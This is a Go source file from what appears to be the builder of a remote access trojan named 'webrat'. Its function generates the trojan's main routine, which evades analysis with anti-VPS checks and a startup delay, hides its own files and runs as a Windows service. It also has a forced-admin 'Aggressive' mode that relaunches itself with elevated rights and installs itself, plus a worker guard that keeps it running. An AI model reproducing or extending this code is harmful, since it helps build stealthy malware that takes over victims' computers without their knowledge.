package buildergen

import (
	"fmt"
	"strings"
)

func templateMainFlow(cfg Config) string {
	delay := cfg.StartupDelaySeconds
	if delay < 0 {
		delay = 0
	}
	if delay > 10 {
		delay = 10
	}

	return strings.TrimSpace(fmt.Sprintf(`
func main() {
	if ensureSingleRunPerBuild() && shouldEnforceBuildLock() {
		os.Exit(0)
	}

	checkAntiVps()

	applyStartupDelay(%d)

	hideSelfFiles()

	if runtime.GOOS == "windows" {
		isSvc, err := svc.IsWindowsService()
		if err == nil && isSvc {
			_ = svc.Run(getServiceName(), &webratService{})
			return
		}
	}

	if len(os.Args) > 1 && os.Args[1] == "worker" {
		runWorkerGuard()
		return
	}

	forceMode := strings.TrimSpace(forceAdminMode)
	aggressiveMode := strings.EqualFold(forceMode, "Aggressive") || strings.EqualFold(forceMode, "Agressive")
	if shouldEnforceBuildLock() && !(aggressiveMode && !isAdmin()) && !ensureSingleRunPerBuild() {
		return
	}

	if aggressiveMode {
		if shouldEnforceBuildLock() {
			if isAggressiveAlreadyInstalled() {
				return
			}

			if !isAdmin() {
				relaunchAsAdmin()
				return
			}

			if opInstallAll() {
				return
			}
		}

		runPrimaryWithWorker()
		return
	}

	runPrimaryWithWorker()
}
`)
}